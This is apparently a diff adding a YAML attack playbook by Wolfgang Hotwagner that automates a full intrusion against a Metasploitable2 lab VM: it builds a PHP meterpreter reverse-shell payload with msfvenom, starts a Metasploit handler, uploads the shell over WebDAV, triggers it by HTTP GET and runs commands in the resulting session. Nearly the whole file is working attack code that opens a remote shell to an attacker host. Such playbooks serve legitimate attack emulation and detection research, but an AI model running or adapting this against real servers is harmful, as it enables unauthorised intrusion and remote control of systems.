@@ -1,0 +1,66 @@
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Create php-reverseshell-payload
+#     2. Start reverseshell-listener in background
+#     3. Upload php-reverseshell-payload via webdav
+#     4. Execute php-reverseshell-payload via http-get in background
+#     6. execute commands via reverseshell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 192.168.10.225
+  ATTACKER: 172.17.0.127
+  PAYLOAD: php/meterpreter/reverse_tcp
+  LPORT: 4444
+
+commands:
+  - type: mktemp
+    variable: RSHELL
+
+  # generate reverse-shell
+  - type: shell
+    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKER LPORT=$LPORT -f raw > ${RSHELL}.php
+
+  # start shell-listener in background
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+  # upload shell via webdav
+  - type: http-client
+    cmd: PUT
+    url: http://$METASPLOITABLE/dav/shell.php
+    local_path: ${RSHELL}.php
+
+  # execute shell via http-get in background
+  - type: http-client
+    cmd: GET
+    url: http://$METASPLOITABLE/dav/shell.php
+    background: true
+    kill_on_exit: true
+
+  # wait two seconds
+  - type: sleep
+    seconds: 2
+
+  # execute command in reverse-shell
+  - type: msf-session
+    stdapi: True
+    cmd: getuid
+    session: shell
+
+  - type: msf-session
+    cmd: sysinfo
+    session: shell
